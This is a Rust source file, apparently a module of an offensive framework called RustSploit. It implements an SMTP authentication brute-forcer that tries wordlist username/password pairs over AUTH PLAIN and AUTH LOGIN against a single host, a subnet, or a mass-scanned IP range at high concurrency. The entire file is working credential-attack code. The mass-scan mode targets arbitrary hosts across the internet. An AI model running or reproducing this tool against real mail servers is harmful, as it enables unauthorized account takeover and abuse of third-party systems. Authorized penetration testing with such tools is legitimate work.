use anyhow::{anyhow, Context, Result};
use colored::*;
use std::net::{ToSocketAddrs, IpAddr};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::Duration;
use std::io::{BufRead, BufReader, Write};
use base64::{engine::general_purpose, Engine as _};

use crate::utils::{
    load_lines,
    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
};
use crate::modules::creds::utils::{
    BruteforceConfig, LoginResult, SubnetScanConfig,
    generate_combos, run_bruteforce, run_subnet_bruteforce,
    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "SMTP Brute Force".to_string(),
        description: "Brute-force SMTP authentication supporting PLAIN and LOGIN mechanisms. Tests credentials against mail servers with combo mode and subnet scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("\n{}", "=== SMTP Bruteforce Module (RustSploit) ===".bold().cyan());
    crate::mprintln!();

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
        let users = Arc::new(users);
        let passes = Arc::new(passes);

        return run_mass_scan(target, MassScanConfig {
            protocol_name: "SMTP",
            default_port: 25,
            state_file: "smtp_hose_state.log",
            default_output: "smtp_mass_results.txt",
            default_concurrency: 500,
        }, move |ip: IpAddr, port: u16| {
            let users = users.clone();
            let passes = passes.clone();
            async move {
                // Quick connect check
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
                    return None;
                }

                let target_str = ip.to_string();
                for user in users.iter() {
                    for pass in passes.iter() {
                        let t = target_str.clone();
                        let u = user.clone();
                        let p = pass.clone();
                        let res = tokio::task::spawn_blocking(move || {
                            try_smtp_login(&t, port, &u, &p)
                        }).await;

                        match res {
                            Ok(Ok(true)) => {
                                let msg = format!("{} -> {}:{}", target_str, user, pass);
                                crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                                return Some(format!("{}\n", msg));
                            }
                            Ok(Err(e)) => {
                                let err = e.to_string().to_lowercase();
                                if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
                                    return None;
                                }
                            }
                            _ => {}
                        }
                    }
                }
                None
            }
        }).await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535).await? as u16;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_subnet_results.txt").await?;

        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "smtp",
            source_module: "creds/generic/smtp_bruteforce",
            skip_tcp_check: false,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            async move {
                let target_str = ip.to_string();
                let res = tokio::task::spawn_blocking(move || {
                    try_smtp_login(&target_str, port, &user, &pass)
                }).await;
                match res {
                    Ok(Ok(true)) => LoginResult::Success,
                    Ok(Ok(false)) => LoginResult::AuthFailed,
                    Ok(Err(e)) => LoginResult::Error {
                        message: e.to_string(),
                        retryable: true,
                    },
                    Err(e) => LoginResult::Error {
                        message: format!("Task panic: {}", e),
                        retryable: false,
                    },
                }
            }
        }).await;
    }

    // --- Single Target Mode ---
    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535).await? as u16;
    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;

    let threads = cfg_prompt_int_range("threads", "Threads", 8, 1, 256).await? as usize;
    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;

    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true).await?;
    let combo_mode = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false).await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "smtp_results.txt").await?;

    let usernames = load_lines(&username_wordlist)?;
    let passwords = load_lines(&password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        anyhow::bail!("Username or password list is empty — nothing to bruteforce");
    }
    crate::mprintln!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());

    let combos = generate_combos(&usernames, &passwords, combo_mode);

    let try_login = move |target: String, port: u16, user: String, pass: String| {
        async move {
            let res = tokio::task::spawn_blocking(move || {
                try_smtp_login(&target, port, &user, &pass)
            }).await;
            match res {
                Ok(Ok(true)) => LoginResult::Success,
                Ok(Ok(false)) => LoginResult::AuthFailed,
                Ok(Err(e)) => LoginResult::Error {
                    message: e.to_string(),
                    retryable: true,
                },
                Err(e) => LoginResult::Error {
                    message: format!("Task panic: {}", e),
                    retryable: false,
                },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency: threads,
        stop_on_success,
        verbose,
        delay_ms,
        max_retries: 2,
        service_name: "smtp",
        source_module: "creds/generic/smtp_bruteforce",
    }, combos, try_login).await?;

    result.print_found();
    result.save_to_file(&output_file)?;

    Ok(())
}

/// Read a single SMTP response line (terminated by \n).
/// Returns the trimmed line or an error on timeout / EOF.
fn read_smtp_line(reader: &mut BufReader<&TcpStream>) -> Result<String> {
    let mut line = String::new();
    let n = reader.read_line(&mut line).context("SMTP read")?;
    if n == 0 {
        return Err(anyhow!("Connection closed"));
    }
    Ok(line.trim_end().to_string())
}

fn try_smtp_login(target: &str, port: u16, username: &str, password: &str) -> Result<bool> {
    let addr = format!("{}:{}", target, port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
    let stream = crate::utils::blocking_tcp_connect(&socket, Duration::from_millis(2000))?;
    let _ = stream.set_nodelay(true);
    stream.set_read_timeout(Some(Duration::from_millis(2000)))?;
    stream.set_write_timeout(Some(Duration::from_millis(2000)))?;

    let mut reader = BufReader::new(&stream);
    // We write via a reference to the same stream (TcpStream is duplex)
    let mut writer = &stream;

    // Read banner — expect 220
    let banner = read_smtp_line(&mut reader).context("Banner read")?;
    if !banner.starts_with("220") {
        return Err(anyhow!("No 220 banner"));
    }

    // Send EHLO
    writer.write_all(b"EHLO scanner\r\n")?;
    writer.flush()?;

    let mut login_ok = false;
    let mut plain_ok = false;
    let mut ehlo_seen = false;

    // Read multi-line EHLO response (250-... continues, 250 ... ends)
    for _ in 0..10 {
        let line = read_smtp_line(&mut reader).context("EHLO read")?;
        if line.contains("AUTH") && line.contains("PLAIN") { plain_ok = true; }
        if line.contains("AUTH") && line.contains("LOGIN") { login_ok = true; }
        // "250 " (with space) is the final line of the EHLO response
        if line.starts_with("250 ") { ehlo_seen = true; break; }
        // If the line doesn't start with 250 at all, something is wrong
        if !line.starts_with("250") { break; }
    }
    if !ehlo_seen { return Ok(false); }

    // Try AUTH PLAIN
    if plain_ok {
        let mut blob = vec![0u8];
        blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
        writer.write_all(cmd.as_bytes())?;
        writer.flush()?;

        let resp = read_smtp_line(&mut reader).context("Auth response")?;
        if resp.starts_with("235") {
            let _ = writer.write_all(b"QUIT\r\n");
            return Ok(true);
        }
        if resp.starts_with("5") { return Ok(false); }
    }

    // Try AUTH LOGIN
    if login_ok {
        writer.write_all(b"AUTH LOGIN\r\n")?;
        writer.flush()?;

        // Wait for username prompt (334)
        let prompt1 = read_smtp_line(&mut reader).context("Auth Login prompt")?;
        if !prompt1.starts_with("334") { return Ok(false); }

        let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
        writer.write_all(ucmd.as_bytes())?;
        writer.flush()?;

        // Wait for password prompt (334)
        let prompt2 = read_smtp_line(&mut reader).context("Auth Pass prompt")?;
        if !prompt2.starts_with("334") { return Ok(false); }

        let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
        writer.write_all(pcmd.as_bytes())?;
        writer.flush()?;

        let resp = read_smtp_line(&mut reader).context("Auth final response")?;
        if resp.starts_with("235") {
            let _ = writer.write_all(b"QUIT\r\n");
            return Ok(true);
        }
        if resp.starts_with("5") { return Ok(false); }
    }

    Ok(false)
}

